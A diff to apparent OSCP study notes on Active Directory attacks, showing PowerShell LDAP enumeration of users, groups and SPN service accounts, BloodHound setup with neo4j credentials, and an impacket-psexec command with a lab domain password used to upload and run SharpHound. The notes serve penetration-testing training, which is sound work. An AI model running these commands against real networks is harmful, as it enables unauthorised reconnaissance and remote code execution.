@@ -1,5 +1,5 @@
-# OSCP
-Following repository contains commands and instructions useful for OSCP preparation
+# ACTIVE DIRECTORY ATTACKS
+Following are some important commands and techniques useful for OSCP preparation
 
 ## DOMAIN PENTEST ENVIRONMENT
 ### DOMAIN MACHINES 
@@ -56,13 +56,13 @@ net groups /domain "Domain Admins"
 
 >Following are some popular powersellscripts used for AD enumeraion
 
-1. DISTINGUISHED NAME
++ DISTINGUISHED NAME
 
 ```
 [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() 
 ```
 
-2. LDAP PROVIDER PATH
++ LDAP PROVIDER PATH
 
 ```
 $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() 
@@ -74,7 +74,7 @@ $SearchString += $DistinguishedName
 $SearchString
 ```
 
-3. DIRECTORY SEARCHER CLASS PREPERATION
++ DIRECTORY SEARCHER CLASS PREPERATION
 
 ```
 $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() 
@@ -88,7 +88,7 @@ $objDomain = New-Object System.DirectoryServices.DirectoryEntry
 $Searcher.SearchRoot = $objDomain
 ```
 
-4. DOMAIN USERS
++ DOMAIN USERS
 
 ```
 $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() 
@@ -126,7 +126,7 @@ Write-Host "------------------------"
 }
 ```
 
-4. DOMAIN GROUPS
++ DOMAIN GROUPS
 
 ```
 $domain0bj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
@@ -146,7 +146,7 @@ $obj.Properties.name
 }
 ```
 
-5. NESTED GROUPS - USERS/GROUPS INSIDE GROUPS
++ NESTED GROUPS - USERS/GROUPS INSIDE GROUPS
 
 ```
 $domain0bj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
@@ -219,7 +219,7 @@ $obj.Properties.member
 }
 ```
 
-6. SERVICE ACCOUNTS ENUMERATION VIA SERVICE PRINCIPAL NAMES 
++ SERVICE ACCOUNTS ENUMERATION VIA SERVICE PRINCIPAL NAMES 
 
 ```
 $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
@@ -262,3 +262,54 @@ Foreach($prop in $obj.Properties)
 $prop
 }
 ```
+
+### BLOOD HOUND / SHARP HOUND
+
+#### BLOODHOUND SETUP / KALI
+```
+sudo apt update && sudo apt install -y bloodhound
+sudo neo4j start
+```
+>cred:neo4j/neo4j
+```
+http://localhost:7474/browser/
+```
+>change cred: neo4j/test
+
+>bloodhound start
+
+#### BLOODHOUND USAGE - SCENARIO 1
+
++ Windows Level Working 
+```
+cmd.exe
+Sharphound.exe
+```
+
++ Kali Level Working
+```
+sudo neo4j start
+```
+>bloodhound start
+
+>login with neo4j/test
+
+>import sharphound file
+ 
+>clear database - to clear previous results imported into bloodhound
+
+#### BLOODHOUND USAGE - SCENARIO 2
+
++ Kali Level Working
+```
+impacket-psexec 'FRIENDS/rgeller:Password123!@#@192.168.174.129'
+lput SharpHound.exe
+cd ..
+SharpHound.exe
+dir
+20230106123630_BloodHound.zip
+lget 20230106123630_BloodHound.zip
+```
+
+
+
